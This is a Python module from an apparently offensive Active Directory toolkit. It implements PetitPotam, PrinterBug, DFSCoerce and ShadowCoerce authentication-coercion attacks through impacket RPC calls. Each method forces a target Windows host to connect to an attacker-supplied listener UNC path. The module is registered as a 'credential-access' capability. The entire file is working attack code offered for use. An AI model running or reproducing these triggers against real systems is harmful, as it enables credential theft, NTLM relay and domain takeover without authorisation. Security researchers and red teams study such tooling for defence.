"""Coercion trigger executor: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


METHODS = {
    "petitpotam": {
        "iface_uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
        "iface_version": "1.0",
        "endpoint": r"\pipe\lsarpc",
        "op": "EfsRpcOpenFileRaw",
        "note": "MS-EFSRPC 0x00 EfsRpcOpenFileRaw",
    },
    "printerbug": {
        "iface_uuid": "12345678-1234-abcd-ef00-0123456789ab",
        "iface_version": "1.0",
        "endpoint": r"\pipe\spoolss",
        "op": "RpcRemoteFindFirstPrinterChangeNotificationEx",
        "note": "MS-RPRN spoolss abuse",
    },
    "dfscoerce": {
        "iface_uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
        "iface_version": "3.0",
        "endpoint": r"\pipe\netdfs",
        "op": "NetrDfsAddStdRoot",
        "note": "MS-DFSNM add-std-root",
    },
    "shadowcoerce": {
        "iface_uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
        "iface_version": "1.0",
        "endpoint": r"\pipe\FssagentRpc",
        "op": "IsPathSupported",
        "note": "MS-FSRVP shadowcoerce",
    },
}


def _trigger(target: Target, host: str, listener: str, method: str) -> dict[str, Any]:
    from impacket.dcerpc.v5 import epm, rpcrt, transport
    from impacket.dcerpc.v5.dtypes import NULL, WSTR

    meta = METHODS[method]
    binding = fr"ncacn_np:{host}[{meta['endpoint']}]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    lm, nt = target.lm_nt_hashes()
    if hasattr(rpc_transport, "set_credentials"):
        rpc_transport.set_credentials(
            target.username or "",
            target.password or "",
            target.domain,
            lm,
            nt,
            target.aes_key or "",
        )
    if target.use_kerberos:
        rpc_transport.set_kerberos(True, kdcHost=target.dc_ip)
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(rpcrt.uuidtup_to_bin((meta["iface_uuid"], meta["iface_version"])))

    listener_path = fr"\\{listener}\pwn\x"
    try:
        request = _build_coercion_request(method, listener_path)
        dce.request(request)
        return {"method": method, "listener": listener_path, "ok": True}
    except Exception as exc:  # noqa: BLE001
        text = str(exc)
        if "STATUS_BAD_NETWORK_NAME" in text or "STATUS_NETWORK_PATH_NOT_FOUND" in text:
            # Expected: target attempted to reach listener.
            return {"method": method, "listener": listener_path, "ok": True, "expected_error": text[:120]}
        return {"method": method, "listener": listener_path, "ok": False, "error": text[:200]}
    finally:
        try:
            dce.disconnect()
        except Exception:  # noqa: BLE001
            pass


def _build_coercion_request(method: str, listener: str):
    if method == "petitpotam":
        from impacket.dcerpc.v5 import even6  # noqa: F401  # ensures registration
        from impacket.dcerpc.v5.efsr import EfsRpcOpenFileRaw

        req = EfsRpcOpenFileRaw()
        req["FileName"] = listener + "\x00"
        req["Flag"] = 0
        return req
    if method == "printerbug":
        from impacket.dcerpc.v5.rprn import RpcRemoteFindFirstPrinterChangeNotificationEx

        req = RpcRemoteFindFirstPrinterChangeNotificationEx()
        req["pszLocalMachine"] = listener + "\x00"
        req["fdwFilter"] = 0
        req["fdwOptions"] = 0
        req["pszLocalMachine"] = listener + "\x00"
        return req
    if method == "dfscoerce":
        from impacket.dcerpc.v5.rpcrt import DCERPCException  # noqa: F401
        # Minimal DFSNM NetrDfsAddStdRoot skeleton
        from impacket.dcerpc.v5.ndr import NDRCALL
        from impacket.dcerpc.v5.dtypes import WSTR, ULONG

        class NetrDfsAddStdRoot(NDRCALL):
            opnum = 12
            structure = (
                ("ServerName", WSTR),
                ("RootShare", WSTR),
                ("Comment", WSTR),
                ("ApiFlags", ULONG),
            )

        req = NetrDfsAddStdRoot()
        req["ServerName"] = listener + "\x00"
        req["RootShare"] = "share\x00"
        req["Comment"] = "\x00"
        req["ApiFlags"] = 1
        return req
    if method == "shadowcoerce":
        from impacket.dcerpc.v5.ndr import NDRCALL
        from impacket.dcerpc.v5.dtypes import WSTR, LONG

        class IsPathSupported(NDRCALL):
            opnum = 8
            structure = (("ShareName", WSTR),)

        req = IsPathSupported()
        req["ShareName"] = listener + "\x00"
        return req
    raise ValueError(f"unknown method: {method}")


@register_capability(
    id="coerce",
    summary="Trigger PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce",
    category="credential-access",
    tags=("coerce", "petitpotam", "printerbug", "dfscoerce", "shadowcoerce"),
    destructive=False,
)
class Coerce:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("coerce")
        host = kwargs.get("host") or target.dc_ip
        listener = kwargs.get("listener")
        methods = str(kwargs.get("methods") or "petitpotam,printerbug,dfscoerce,shadowcoerce")
        if not listener:
            raise RuntimeError("Pass -P listener=<attacker-host-or-ip>.")

        chosen = [m.strip() for m in methods.split(",") if m.strip() in METHODS]
        console.print(
            f"[bold]coerce[/bold] host={host} listener={listener} methods={chosen}"
        )

        results: list[dict[str, Any]] = []
        for method in chosen:
            outcome = _trigger(target, host, str(listener), method)
            console.print(
                f"  {method}: {'ok' if outcome.get('ok') else 'fail'}"
            )
            results.append(outcome)

        payload = {"host": host, "listener": listener, "results": results}
        out = session.path("coerce.json")
        out.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "coerce.complete",
            host=host,
            listener=listener,
            success=sum(1 for r in results if r.get("ok")),
        )
        console.print(f"[green]Done[/green]  successes={sum(1 for r in results if r.get('ok'))}")
        return payload
